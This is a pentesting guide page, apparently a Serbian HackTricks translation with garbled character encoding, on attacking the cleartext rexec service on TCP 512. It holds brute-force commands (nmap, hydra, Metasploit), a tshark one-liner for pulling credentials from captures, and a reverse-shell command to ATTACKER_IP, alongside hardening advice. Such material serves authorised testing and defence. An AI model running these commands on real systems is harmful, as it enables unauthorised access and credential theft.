# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

Rexec (remote **exec**) je jedan od originalnih Berkeley *r*-servisa (zajedno sa `rlogin`, `rsh`, â€¦).  OmoguÄ‡ava **daljinsko izvrÅ¡avanje komandi** **autentifikovano samo sa korisniÄkim imenom i lozinkom u Äistom tekstu**.  Protokol je definisan poÄetkom 1980-ih (vidi RFC 1060) i danas se smatra **nesigurnim po dizajnu**.  Ipak, joÅ¡ uvek je podrazumevano omoguÄ‡en u nekim nasleÄ‘enim UNIX / mreÅ¾no povezanim ureÄ‘ajima i povremeno se pojavljuje tokom internih pentestova.

**Podrazumevani port:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> ğŸ”¥  Sav saobraÄ‡aj â€“ ukljuÄujuÄ‡i akreditive â€“ se prenosi **nekriptovano**. Svako ko ima moguÄ‡nost da prisluÅ¡kuje mreÅ¾u moÅ¾e da povrati korisniÄko ime, lozinku i komandu.

### Brzi pregled protokola

1. Klijent se povezuje na TCP 512.
2. Klijent Å¡alje tri **NUL-terminirane** stringa:
* broj porta (kao ASCII) na kojem Å¾eli da primi stdout/stderr (Äesto `0`),
* **korisniÄko ime**,
* **lozinku**.
3. Poslednji NUL-terminirani string sa **komandom** koja treba da se izvrÅ¡i se Å¡alje.
4. Server odgovara sa jednim 8-bitnim statusnim bajtom (0 = uspeh, `1` = neuspeh) praÄ‡enim izlazom komande.

To znaÄi da moÅ¾ete ponoviti razmenu sa samo `echo -e` i `nc`:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
Ako su akreditivi validni, dobiÄ‡ete izlaz `id` odmah nazad na istoj vezi.

### RuÄna upotreba sa klijentom

Mnoge Linux distribucije joÅ¡ uvek isporuÄuju legacijski klijent unutar paketa **inetutils-rexec** / **rsh-client**:
```bash
rexec -l user -p password <target> "uname -a"
```
Ako je `-p` izostavljen, klijent Ä‡e interaktivno traÅ¾iti lozinku (vidljivu na mreÅ¾i u Äistom tekstu!).

---
## Enumeracija i Brute-forcing

### [**Brute-force**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE koristi protokol opisan iznad da brzo proba kredencijale.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` ima posveÄ‡en **rexec** modul i ostaje najbrÅ¾i offline bruteforcer. `medusa` (`-M REXEC`) i `ncrack` (`rexec` modul) mogu se koristiti na isti naÄin.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
Modul Ä‡e pokrenuti shell nakon uspeha i saÄuvati kredencijale u bazi podataka.

---
## Snimanje kredencijala

PoÅ¡to je sve u Äistom tekstu, **snimci mreÅ¾e su neprocenjivi**. Sa kopijom saobraÄ‡aja moÅ¾ete izvuÄ‡i kredencijale bez dodirivanja mete:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark omoguÄ‡ite *Decode As â€¦â€‹* TCP 512 â†’ REXEC da biste videli lepo analizirana polja.)

---
## Saveti nakon eksploatacije

* Komande se izvrÅ¡avaju sa privilegijama datog korisnika. Ako je `/etc/pam.d/rexec` pogreÅ¡no konfiguran (npr. `pam_rootok`), root ljuske su ponekad moguÄ‡e.
* Rexec ignoriÅ¡e korisniÄku ljusku i izvrÅ¡ava komandu putem `/bin/sh -c <cmd>`. Stoga moÅ¾ete koristiti tipiÄne trikove za bekstvo iz ljuske (`;`, ``$( )``, backticks) da poveÅ¾ete viÅ¡e komandi ili pokrenete obrnute ljuske:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* Lozinke se Äesto Äuvaju u **~/.netrc** na drugim sistemima; ako kompromitujete jedan host, moÅ¾ete ih ponovo koristiti za lateralno kretanje.

---
## OjaÄavanje / Detekcija

* **Ne izlaÅ¾ite rexec**; zamenite ga sa SSH. Virtuelno svi moderni *inetd* superserveri podrazumevano komentariÅ¡u ovu uslugu.
* Ako ga morate zadrÅ¾ati, ograniÄite pristup pomoÄ‡u TCP wrapper-a (`/etc/hosts.allow`) ili pravila vatrozida i primenite jake lozinke po nalogu.
* Pratite saobraÄ‡aj ka :512 i pokretanje `rexecd` procesa. Jedan paketni snimak je dovoljan da otkrije kompromitaciju.
* OnemoguÄ‡ite `rexec`, `rlogin`, `rsh` zajedno â€“ dele veÄ‡inu istog koda i slabosti.

---

## Reference

* Nmap NSE `rexec-brute` dokumentacija â€“ [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Rapid7 Metasploit modul `auxiliary/scanner/rservices/rexec_login` â€“ [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
